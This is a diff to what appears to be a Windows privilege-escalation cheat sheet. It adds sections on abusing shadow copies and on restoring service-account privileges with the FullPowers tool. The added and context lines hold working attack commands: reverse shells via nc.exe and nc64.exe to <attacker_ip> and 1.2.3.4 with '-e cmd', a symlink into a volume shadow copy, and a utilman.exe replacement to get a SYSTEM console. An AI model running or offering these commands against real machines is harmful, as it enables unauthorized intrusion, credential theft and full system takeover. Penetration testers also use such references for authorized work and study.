@@ -25,9 +25,11 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
   * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
   * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
   * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
@@ -718,6 +720,21 @@ $computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
+## EoP - Abusing Shadow Copies
+
+If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
+
+```powershell
+# List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+  
+# List shadow copies using diskshadow
+diskshadow list shadows all
+  
+# Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+```
+
 ## EoP - From local administrator to NT SYSTEM
 
 ```powershell
@@ -758,6 +775,37 @@ Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary bel
 |`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
 |`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
 
+### Restore A Service Account's Privileges
+
+> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.
+
+```powershell
+# https://github.com/itm4n/FullPowers
+
+c:\TOOLS>FullPowers
+[+] Started dummy thread with id 9976
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19041.84]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+
 
 ### Meterpreter getsystem and alternatives
 
@@ -794,7 +842,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ### Juicy Potato (abusing the golden privileges)
 
 Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809. 
+:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
